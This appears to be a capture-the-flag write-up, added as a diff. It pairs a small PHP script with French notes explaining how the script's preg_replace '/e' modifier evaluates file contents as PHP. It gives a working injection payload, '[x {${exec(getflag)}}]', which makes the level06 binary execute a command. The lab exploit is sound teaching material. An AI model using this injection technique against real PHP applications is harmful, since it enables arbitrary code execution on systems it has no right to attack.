@@ -1,0 +1,30 @@
+#!/usr/bin/php
+<?php
+function y($m) { 
+	$m = preg_replace("/\./", " x ", $m); 
+	$m = preg_replace("/@/", " y", $m); 
+	return $m; 
+}
+
+function x($y, $z) { 
+	$a = file_get_contents($y); 
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+	$a = preg_replace("/\[/", "(", $a); 
+	$a = preg_replace("/\]/", ")", $a); 
+	return $a; 
+}
+
+$r = x($argv[1], $argv[2]); 
+print $r;
+?>
+
+En gros ce script, utilise du regex pour remplacer certains elements
+Le plus interessant est la ligne 11: $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+le /e permet d'executer la deuxieme partie de la regex comme du code php
+Donc ici on remplace [x ...] par le resultat de la fonction y appliquee au contenu de [x ...]
+
+on se cree un fichier /tmp/exploit avec le contenu suivant:
+[x {${exec(getflag)}}]
+
+on fait: ./level06 /tmp/exploit
+le script execute getflag et affiche le resultat
